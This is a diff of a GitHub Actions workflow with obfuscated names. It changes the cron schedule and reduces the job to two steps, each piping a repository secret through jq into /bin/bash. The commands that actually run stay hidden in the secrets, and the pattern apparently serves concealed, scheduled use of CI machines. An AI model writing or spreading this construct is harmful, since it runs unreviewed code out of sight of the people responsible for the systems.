@@ -1,10 +1,8 @@
 name: jiangjing19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 5/6 * * *'
-
+    - cron: '4 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,16 +11,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiangjing19871010
         env:
-          xtjxw4: ${{ secrets.xtjxw4 }}
+          wj4: ${{ secrets.wj4 }}
         run: |
-          echo $xtjxw4 | jq -r .fh59 | /bin/bash
-          echo $tg0 | jq -r .fdzn47 | /bin/bash
-          echo $saqj6955 | jq -r .ucn1 | /bin/bash
-          echo $io5328 | jq -r .fjt994 | /bin/bash
-          echo $ygol5 | jq -r .oj0792 | /bin/bash
-          echo $flr246 | jq -r .rr5699 | /bin/bash
-          echo $nn11811 | jq -r .rg5 | /bin/bash
-          echo $gbc170 | jq -r .j414 | /bin/bash
-          echo $dwzye2 | jq -r .o77 | /bin/bash
-          echo $vb34 | jq -r .y2 | /bin/bash
+          echo $wj4 | jq -r .t7 | /bin/bash
+          echo $coww9 | jq -r .ky39 | /bin/bash
 
